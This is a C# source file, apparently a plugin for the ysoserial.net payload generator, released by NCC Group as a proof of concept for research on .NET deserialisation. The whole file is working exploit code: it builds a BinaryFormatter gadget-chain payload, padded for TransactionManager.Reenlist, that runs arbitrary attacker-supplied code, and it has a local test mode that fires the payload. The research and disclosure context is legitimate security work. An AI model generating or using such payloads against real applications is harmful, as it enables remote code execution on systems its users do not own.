using System.Collections.Generic;
using NDesk.Options;
using System;
using ysoserial_frmv2.Generators;
using System.IO;
using System.Transactions;

/**
 * Author: Soroush Dalili (@irsdl) from NCC Group (@NCCGroupInfosec)
 * 
 * Comments: 
 *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
 *  See `TransactionManager.Reenlist(Guid, Byte[], IEnlistmentNotification) Method`: https://docs.microsoft.com/en-us/dotnet/api/system.transactions.transactionmanager.reenlist  
 *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
 *  This PoC uses BinaryFormatter from TypeConfuseDelegate
 *  This PoC produces an error and may crash the application
 **/

namespace ysoserial_frmv2.Plugins
{
    class TransactionManagerReenlistPlugin : Plugin
    {
        static string command = "";
        static Boolean test = false;

        static OptionSet options = new OptionSet()
            {
                {"c|command=", "the command to be executed using ActivitySurrogateSelectorFromFileGenerator e.g. \"ExploitClass.cs; System.Windows.Forms.dll\"", v => command = v },
                {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
            };

        public string Name()
        {
            return "TransactionManagerReenlist";
        }

        public string Description()
        {
            return "Generates payload for the TransactionManager.Reenlist method";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            List<string> extra;
            try
            {
                extra = options.Parse(args);
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }

            object payload = "";
            if (String.IsNullOrEmpty(command) || String.IsNullOrEmpty(command.Trim()))
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }

            byte[] serializedData = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate(command, "BinaryFormatter", false);
            byte[] newSerializedData = new byte[serializedData.Length + 5]; // it has BinaryReader ReadInt32() + 1 additional byte read
            serializedData.CopyTo(newSerializedData, 5);
            newSerializedData[0] = 1;


            payload = newSerializedData;

            if (test)
            {
                // PoC on how it works in practice
                try
                {
                    TestMe myTransactionEnlistment = new TestMe();
                    TransactionManager.Reenlist(Guid.NewGuid(), newSerializedData, myTransactionEnlistment);
                }catch(Exception e)
                {
                    // always an error because of how it's been made
                }
            }
            

            return payload;
        }

        class TestMe : IEnlistmentNotification
        {
            public void Commit(Enlistment enlistment)
            {
                throw new NotImplementedException();
            }

            public void InDoubt(Enlistment enlistment)
            {
                throw new NotImplementedException();
            }

            public void Prepare(PreparingEnlistment preparingEnlistment)
            {
                throw new NotImplementedException();
            }

            public void Rollback(Enlistment enlistment)
            {
                throw new NotImplementedException();
            }
        }
    }
}
